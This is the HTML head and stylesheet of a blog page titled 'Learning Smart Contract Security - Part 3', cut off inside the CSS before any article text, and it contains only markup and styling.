<!DOCTYPE html><html  lang="en" data-capo=""><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Learning Smart Contract Security - Part 3 | alexshepherd.me</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com">
<script src="/plugins/jquery-3.3.1.min.js"></script>
<script src="/plugins/moment.min.js"></script>
<script src="/plugins/livestamp.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700;800;900&family=Rubik:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,300&family=Work+Sans:wght@200&family=Outfit:wght@200&family=Pontano+Sans:wght@300&family=Inconsolata:wght@500&display=swap">
<style>*,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgba(59,130,246,.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgba(59,130,246,.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/*! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com*/*,:after,:before{border:0 solid #e5e7eb;box-sizing:border-box}:after,:before{--tw-content:""}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;font-family:ui-sans-serif,system-ui,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;font-feature-settings:normal;font-variation-settings:normal;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-tap-highlight-color:transparent}body{line-height:inherit;margin:0}hr{border-top-width:1px;color:inherit;height:0}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-feature-settings:normal;font-size:1em;font-variation-settings:normal}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{border-collapse:collapse;border-color:inherit;text-indent:0}button,input,optgroup,select,textarea{color:inherit;font-family:inherit;font-feature-settings:inherit;font-size:100%;font-variation-settings:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0}fieldset,legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{color:#9ca3af;opacity:1}input::placeholder,textarea::placeholder{color:#9ca3af;opacity:1}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{height:auto;max-width:100%}[hidden]:where(:not([hidden=until-found])){display:none}:root{--accent1-rgb:238,95,56}body{font-size:16px;font-weight:400;--tw-text-opacity:1;color:rgb(99 99 99/var(--tw-text-opacity,1))}h1{font-size:40px}h1,h2{font-weight:700}h2{font-size:24px}@media (min-width:1024px){h2{font-size:36px}}@media (min-width:768px) and (max-width:1023px){h2{font-size:28px}}h3{font-size:32px;font-weight:700}@media (max-width:767px){h3{font-size:20px}}@media (min-width:768px) and (max-width:1023px){h3{font-size:24px}}h4{font-size:20px;font-weight:700}@media (min-width:1024px){h4{font-size:24px}}h5{font-size:18px;font-weight:700}@media (min-width:1024px){h5{font-size:22px}}h6{font-size:16px;font-weight:700}@media (min-width:1024px){h6{font-size:18px}}a{--tw-text-opacity:1;color:rgb(0 2 72/var(--tw-text-opacity,1));transition-duration:.3s;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1)}a:hover{text-decoration-line:underline}button{transition-duration:.3s;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1)}.container{max-width:100%;padding:0 15px;width:100%}@media (max-width:1023px){.container{max-width:750x}}@media (min-width:1024px){.container{max-width:992px}}@media (min-width:1200px){.container{max-width:1200px}}.visible{visibility:visible}.static{position:static}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.bottom-0{bottom:0}.left-0{left:0}.right-0{right:0}.top-0{top:0}.z-10{z-index:10}.order-first{order:-9999}.float-right{float:right}.mx-auto{margin-left:auto;margin-right:auto}.my-0{margin-bottom:0;margin-top:0}.my-2{margin-top:.5rem}.mb-2,.my-2{margin-bottom:.5rem}.mb-3{margin-bottom:.75rem}.mt-14{margin-top:3.5rem}.mt-2{margin-top:.5rem}.mt-\[5px\]{margin-top:5px}.block{display:block}.inline{display:inline}.flex{display:flex}.table{display:table}.grid{display:grid}.contents{display:contents}.hidden{display:none}.size-3{height:.75rem;width:.75rem}.h-7{height:1.75rem}.h-full{height:100%}.w-7{width:1.75rem}.w-full{width:100%}.max-w-\[150px\]{max-width:150px}.max-w-\[180px\]{max-width:180px}.max-w-\[210px\]{max-width:210px}.max-w-\[405px\]{max-width:405px}.cursor-pointer{cursor:pointer}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}.items-center{align-items:center}.justify-end{justify-content:flex-end}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.justify-around{justify-content:space-around}.gap-2{gap:.5rem}.gap-\[30px\]{gap:30px}.overflow-hidden{overflow:hidden}.overflow-x-auto{overflow-x:auto}.rounded-full{border-radius:9999px}.rounded-md{border-radius:.375rem}.border{border-width:1px}.border-t{border-top-width:1px}.border-\[\#bbb\]{--tw-border-opacity:1;border-color:rgb(187 187 187/var(--tw-border-opacity,1))}.border-zinc-50{--tw-border-opacity:1;border-color:rgb(250 250 250/var(--tw-border-opacity,1))}.bg-\[\#28C840\]{--tw-bg-opacity:1;background-color:rgb(40 200 64/var(--tw-bg-opacity,1))}.bg-\[\#F5F5F5\]{--tw-bg-opacity:1;background-color:rgb(245 245 245/var(--tw-bg-opacity,1))}.bg-\[\#FE5F57\]{--tw-bg-opacity:1;background-color:rgb(254 95 87/var(--tw-bg-opacity,1))}.bg-\[\#FEBC2E\]{--tw-bg-opacity:1;background-color:rgb(254 188 46/var(--tw-bg-opacity,1))}.bg-accent1{--tw-bg-opacity:1;background-color:rgb(11 60 93/var(--tw-bg-opacity,1))}.bg-code_background{--tw-bg-opacity:1;background-color:rgb(21 23 24/var(--tw-bg-opacity,1))}.bg-neutral-400{--tw-bg-opacity:1;background-color:rgb(163 163 163/var(--tw-bg-opacity,1))}.bg-transparent{background-color:transparent}.bg-cover{background-size:cover}.bg-center{background-position:50%}.bg-no-repeat{background-repeat:no-repeat}.stroke-white{stroke:#fff}.p-1{padding:.25rem}.p-\[30px\]{padding:30px}.px-3{padding-left:.75rem;padding-right:.75rem}.px-5{padding-left:1.25rem;padding-right:1.25rem}.px-7{padding-left:1.75rem;padding-right:1.75rem}.py-3{padding-bottom:.75rem;padding-top:.75rem}.py-4{padding-bottom:1rem;padding-top:1rem}.py-5{padding-bottom:1.25rem;padding-top:1.25rem}.py-6{padding-bottom:1.5rem;padding-top:1.5rem}.pb-5{padding-bottom:1.25rem}.pb-6{padding-bottom:1.5rem}.pb-\[70px\]{padding-bottom:70px}.pt-2{padding-top:.5rem}.pt-3{padding-top:.75rem}.pt-7{padding-top:1.75rem}.pt-\[40px\]{padding-top:40px}.text-center{text-align:center}.font-heebo{font-family:Heebo,ui-sans-serif,system-ui,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}.font-mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.font-pontano{font-family:Pontano Sans,ui-sans-serif,system-ui,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}.text-\[15px\]{font-size:15px}.text-\[17px\]{font-size:17px}.text-\[25px\]{font-size:25px}.text-\[40px\]{font-size:40px}.text-xs{font-size:.75rem;line-height:1rem}.font-\[500\]{font-weight:500}.font-bold{font-weight:700}.font-extrabold{font-weight:800}.uppercase{text-transform:uppercase}.leading-7{line-height:1.75rem}.leading-\[1\]{line-height:1}.leading-normal{line-height:1.5}.text-heading{--tw-text-opacity:1;color:rgb(0 2 72/var(--tw-text-opacity,1))}.text-paragraph{--tw-text-opacity:1;color:rgb(99 99 99/var(--tw-text-opacity,1))}.text-primary{--tw-text-opacity:1;color:rgb(51 51 51/var(--tw-text-opacity,1))}.text-slate-500{--tw-text-opacity:1;color:rgb(100 116 139/var(--tw-text-opacity,1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1))}.text-zinc-400{--tw-text-opacity:1;color:rgb(161 161 170/var(--tw-text-opacity,1))}.text-zinc-50{--tw-text-opacity:1;color:rgb(250 250 250/var(--tw-text-opacity,1))}.text-zinc-600{--tw-text-opacity:1;color:rgb(82 82 91/var(--tw-text-opacity,1))}.opacity-50{opacity:.5}.opacity-\[0\.15\]{opacity:.15}.shadow-\[0_0_50px_0_rgba\(196\2c 206\2c 213\2c 0\.2\)\]{--tw-shadow:0 0 50px 0 rgba(196,206,213,.2);--tw-shadow-colored:0 0 50px 0 var(--tw-shadow-color)}.shadow-\[0_0_50px_0_rgba\(196\2c 206\2c 213\2c 0\.2\)\],.shadow-lg{box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-lg{--tw-shadow:0 10px 15px -3px rgba(0,0,0,.1),0 4px 6px -4px rgba(0,0,0,.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color),0 4px 6px -4px var(--tw-shadow-color)}.outline{outline-style:solid}.filter{filter:var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)}.transition{transition-duration:.15s;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1)}.transition-all{transition-duration:.15s;transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1)}.duration-300{transition-duration:.3s}.duration-500{transition-duration:.5s}.title-stroke{text-shadow:3px 3px 0 #ee5f38,-1px -1px 0 #ee5f38,1px -1px 0 #ee5f38,-1px 1px 0 #ee5f38,1px 1px 0 #ee5f38}#preloader{display:flex;height:100vh;left:0;position:fixed;top:0;width:100%;z-index:999}#preloader:before{left:0}#preloader:after,#preloader:before{height:100%;position:absolute;top:0;width:50%;z-index:-1;--tw-bg-opacity:1;background-color:rgb(0 0 0/var(--tw-bg-opacity,1));transition-duration:.3s;transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);--tw-content:"";content:var(--tw-content)}#preloader:after{left:auto;right:0}.preloaded:after,.preloaded:before{animation:preloadedDone .3s ease-in-out .5s forwards}.loader--border{height:250px;margin:auto;overflow:hidden;position:relative;transition-duration:.7s;transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);width:1px}.loader--border:before{height:0;top:50%;--tw-translate-y:-50%;--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1));--tw-content:""}.loader--border:after,.loader--border:before{content:var(--tw-content);left:0;position:absolute;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));width:1px}.loader--border:after{height:100%;top:0;--tw-translate-y:-100%;--tw-bg-opacity:1;background-color:rgb(153 153 153/var(--tw-bg-opacity,1));--tw-content:""}.loader--border:before{animation:borderLine 1s ease-in-out 0s forwards}.loader--border:after{animation:borderRound 1.2s linear 0s infinite;animation-delay:2s}.preloaded .loader--border{height:100%!important;opacity:0}.preloaded .loader--border:after{opacity:0}@keyframes borderLine{0%{height:0}to{height:100%}}@keyframes borderRound{0%{transform:translateY(-100%)}to{transform:translateY(200%)}}@keyframes preloadedDone{0%{width:50%}to{width:0}}.header__sticky.sticky{left:0;position:fixed;top:0;width:100%;z-index:98;--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1));padding-left:.25rem;padding-right:.25rem;--tw-shadow:0 0 10px 0 rgba(0,0,0,.1);--tw-shadow-colored:0 0 10px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow);transition-duration:.15s;transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1)}.header__sticky.sticky:is(.dark *){--tw-bg-opacity:1;background-color:rgb(24 26 29/var(--tw-bg-opacity,1))}section{scroll-margin-top:100px}.btn{border-radius:50px;font-size:24px;font-weight:500;padding:10px 42px;transition-duration:.3s;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1)}@media (max-width:767px){.btn{font-size:18px;padding:8px 28px}}@media (min-width:768px) and (max-width:1023px){.btn{font-size:20px;padding-left:32px;padding-right:32px}}.btn--small{border-radius:50px;font-size:17px;font-weight:500;padding:10px 25px;transition-duration:.3s;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1)}.outline-btn{border-width:1px;--tw-border-opacity:1;border-color:rgb(11 60 93/var(--tw-border-opacity,1))}.outline-btn:hover,.solid-btn{--tw-bg-opacity:1;background-color:rgb(11 60 93/var(--tw-bg-opacity,1));--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1))}.solid-btn:hover{--tw-bg-opacity:1;background-color:rgb(51 51 51/var(--tw-bg-opacity,1))}.solid-btn:hover:is(.dark *){--tw-bg-opacity:1;background-color:rgb(24 26 29/var(--tw-bg-opacity,1))}.link-button{display:inline-block;font-size:17px;font-weight:500;line-height:28px;position:relative;text-transform:capitalize;transition-duration:.3s;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1)}.link-button:before{height:7px;position:absolute;top:50%;width:7px;--tw-translate-y:-50%;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));--tw-content:"";content:var(--tw-content)}.link-button:where([dir=ltr],[dir=ltr] *){padding-left:18px}.link-button:where([dir=ltr],[dir=ltr] *):before{content:var(--tw-content);left:0}.link-button:where([dir=rtl],[dir=rtl] *){padding-right:18px}.link-button:where([dir=rtl],[dir=rtl] *):before{content:var(--tw-content);right:0}.service-shape{position:relative}.service-shape:before{bottom:70%;height:115px;left:50%;position:absolute;width:72%;z-index:-1;--tw-translate-x:-50%;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));--tw-content:"";content:var(--tw-content)}.client__logo--padding{padding-left:30px;padding-right:30px}@media (min-width:1024px){.client__logo--padding{padding-left:55px;padding-right:55px}}@media (max-width:600px){.client__logo--padding{padding-left:0;padding-right:0}}@media (min-width:768px) and (max-width:1023px){.client__logo--padding{padding-left:45px;padding-right:45px}}.client__logo--padding--inner{padding-bottom:40px;padding-top:40px}@media (max-width:600px){.client__logo--padding--inner{align-items:center;display:flex;min-height:130px;padding-left:25px;padding-right:25px}}button.is-checked{--tw-text-opacity:1;color:rgb(11 60 93/var(--tw-text-opacity,1))}button.is-checked:is(.dark *){--tw-text-opacity:1;color:rgb(11 60 93/var(--tw-text-opacity,1))}.hero__layer--img.four{animation-duration:3s;animation-iteration-count:infinite;animation-name:animateUpDown;animation-timing-function:cubic-bezier(.54,.085,.5,.92);left:37.5rem;top:36%;transition:all .4s cubic-bezier(.645,.045,.355,1)}@keyframes animateUpDown{0%{transform:translateY(0)}50%{transform:translateY(-20px);-webkit-transform:translateY(-20px);-moz-transform:translateY(-20px);-ms-transform:translateY(-20px);-o-transform:translateY(-20px)}to{transform:translateY(0)}}.animateUpDown{animation-duration:4s;animation-iteration-count:infinite;animation-name:animateUpDown;animation-timing-function:cubic-bezier(.54,.085,.5,.92);transition:all .4s cubic-bezier(.645,.045,.355,1)}.offcanvas__close--btn:is(.dark *):after,.offcanvas__close--btn:is(.dark *):before,.offcanvas__sub_menu_toggle:is(.dark *):after,.offcanvas__sub_menu_toggle:is(.dark *):before{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1))}.portfolio__parent:hover .portfolio__overlay{opacity:.7}.portfolio__parent:hover .portfolio--sub-title,.portfolio__parent:hover .portfolio--title{--tw-translate-y:0px}.portfolio__parent:hover .portfolio--sub-title,.portfolio__parent:hover .portfolio--title,.portfolio__parent:hover .portfolio--zoom{transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.portfolio__parent:hover .portfolio--zoom{--tw-translate-y:-7px}.modal_portfolio.active{opacity:1;visibility:visible}.active .modal__portfolio--content{--tw-translate-y:0px;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.active+.modal_popup_overlay{opacity:.3;visibility:visible}.swiper-pagination{position:inherit}.swiper-pagination-bullet{border-radius:.375rem;height:10px;width:2rem;--tw-bg-opacity:1;background-color:rgb(235 235 235/var(--tw-bg-opacity,1));opacity:1;transition-duration:.3s;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1)}.swiper-pagination-bullet-active{width:2.5rem;--tw-bg-opacity:1;background-color:rgb(11 60 93/var(--tw-bg-opacity,1))}.blog__card:hover .blog__thumb{--tw-scale-x:1.02;--tw-scale-y:1.02;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}#light__to--dark .light--mode__icon,#light__to--dark.dark--version .dark--mode__icon{display:none}#light__to--dark.dark--version .light--mode__icon{display:block}.menu__nav--item:hover>span:last-child{opacity:1;visibility:visible}.menu__nav--item:hover>span:last-child:where([dir=ltr],[dir=ltr] *){right:1.25rem}.menu__nav--item:hover>span:last-child:where([dir=rtl],[dir=rtl] *){left:1.25rem}.menu__nav--item:hover{--tw-bg-opacity:1;background-color:rgb(11 60 93/var(--tw-bg-opacity,1))}.menu__nav--item:hover svg,.mobile--menu__nav--item:hover svg{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1))}.mobile--menu__nav--item:hover{--tw-bg-opacity:1;background-color:rgb(51 51 51/var(--tw-bg-opacity,1))}.toggle__navigation--button span{transition:background-color .2s}.menu--visible .toggle__navigation--button{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1))}.menu--visible .toggle__navigation--button span,.menu--visible .toggle__navigation--button span:after,.menu--visible .toggle__navigation--button span:before{--tw-bg-opacity:1;background-color:rgb(11 60 93/var(--tw-bg-opacity,1))}.toggle__navigation--button span:after,.toggle__navigation--button span:before{backface-visibility:hidden;transition:transform .2s}.menu--visible .toggle__navigation--button span{background-color:transparent}.menu--visible .toggle__navigation--button span:before{transform:rotate(-45deg)}.menu--visible .toggle__navigation--button span:after{transform:rotate(45deg)}.toggle__nav--menu{transition:visibility .3s}.toggle__navigation.menu--visible .toggle__nav--menu{visibility:visible}.toggle__navigation .toggle__nav--menu--bg{box-shadow:0 1px 4px rgba(0,0,0,.2);transition:height .2s,box-shadow .2s}.toggle__navigation.menu--visible .toggle__nav--menu--bg{box-shadow:0 6px 30px rgba(0,0,0,.2);height:100%}.toggle__nav--menu--label-wrapper{transition:color .2s}.toggle__nav--menu--label-wrapper:where([dir=ltr],[dir=ltr] *){padding-left:calc(1rem + 20px)}.toggle__nav--menu--label-wrapper:where([dir=rtl],[dir=rtl] *){padding-right:calc(1rem + 20px)}.toggle__navigation ul li .toggle__nav--menu--label-wrapper:hover,.toggle__navigation ul li.active .toggle__nav--menu--label-wrapper{--tw-text-opacity:1;color:rgb(11 60 93/var(--tw-text-opacity,1))}.toggle__nav--menu--label-wrapper:before{transform:translateX(3px) translateY(-50%) scaleY(0)}.toggle__navigation ul li .toggle__nav--menu--label-wrapper:before{--tw-bg-opacity:1;background-color:rgb(11 60 93/var(--tw-bg-opacity,1))}.toggle__navigation.menu--visible ul li.active .toggle__nav--menu--label-wrapper:before{transform:translateX(-3px) translateY(-50%) scaleY(1);transition:transform .15s .3s}.toggle__nav--menu--label{transform:translateX(-25px)}.toggle__navigation.menu--visible ul .toggle__nav--menu--label{animation:slideInLeft .15s backwards;opacity:1;transform:translateX(0);transition:transform .2s}.toggle__navigation.menu--visible ul li:first-of-type .toggle__nav--menu--label,.toggle__navigation.menu--visible ul li:first-of-type .toggle__nav--menu--label-wrapper:after{animation-delay:.05s}.toggle__navigation.menu--visible ul li:nth-of-type(2) .toggle__nav--menu--label,.toggle__navigation.menu--visible ul li:nth-of-type(2) .toggle__nav--menu--label-wrapper:after{animation-delay:.1s}.toggle__navigation.menu--visible ul li:nth-of-type(3) .toggle__nav--menu--label,.toggle__navigation.menu--visible ul li:nth-of-type(3) .toggle__nav--menu--label-wrapper:after{animation-delay:.15s}.toggle__navigation.menu--visible ul li:nth-of-type(4) .toggle__nav--menu--label,.toggle__navigation.menu--visible ul li:nth-of-type(4) .toggle__nav--menu--label-wrapper:after{animation-delay:.2s}.toggle__navigation.menu--visible ul li:nth-of-type(5) .toggle__nav--menu--label,.toggle__navigation.menu--visible ul li:nth-of-type(5) .toggle__nav--menu--label-wrapper:after{animation-delay:.25s}.toggle__navigation.menu--visible ul li:nth-of-type(6) .toggle__nav--menu--label,.toggle__navigation.menu--visible ul li:nth-of-type(6) .toggle__nav--menu--label-wrapper:after{animation-delay:.28s}@keyframes slideInLeft{0%{opacity:0;transform:translateX(-25px)}to{opacity:1;transform:translateX(0)}}.toggle__navigation.menu--visible{pointer-events:auto}.toggle__nav--menu-icon{transition:transform .2s}.toggle__navigation.menu--visible ul .toggle__nav--menu-icon{opacity:1}.toggle__nav--menu-icon>svg{width:1.1rem}#scroll__top.active{visibility:visible;--tw-translate-y:0px;opacity:1;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.offcanvas__sub_menu_toggle:where([dir=ltr],[dir=ltr] *){right:0}.offcanvas__sub_menu_toggle:where([dir=rtl],[dir=rtl] *){left:0}.offcanvas__sub_menu_item{padding-bottom:15px;padding-top:15px}.offcanvas__sub_menu_item:where([dir=ltr],[dir=ltr] *){padding-left:30px}.offcanvas__sub_menu_item:where([dir=rtl],[dir=rtl] *){padding-right:30px}article.blog-post p{padding-bottom:.5rem;padding-top:.5rem}article.blog-post ul{list-style-type:disc;padding-left:1.5rem}article.blog-post ol{list-style-type:decimal;padding-left:1.5rem}article.blog-post h2{padding-bottom:.25rem;padding-top:1rem}article.blog-post h3,article.blog-post h4{padding-bottom:.125rem;padding-top:.75rem}article.blog-post h5,article.blog-post h6{padding-top:.5rem}article.blog-post code{color:#fff}article.blog-post :not(pre)>code{font-family:Inconsolata,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;padding-left:.25rem;padding-right:.25rem;--tw-text-opacity:1;color:rgb(239 68 68/var(--tw-text-opacity,1))}.hover\:text-accent1:hover{--tw-text-opacity:1;color:rgb(11 60 93/var(--tw-text-opacity,1))}.hover\:no-underline:hover{text-decoration-line:none}.hover\:shadow-\[0_0_100px_0_rgba\(196\2c 206\2c 213\2c 0\.7\)\]:hover{--tw-shadow:0 0 100px 0 rgba(196,206,213,.7);--tw-shadow-colored:0 0 100px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.group:hover .group-hover\:block{display:block}.group:hover 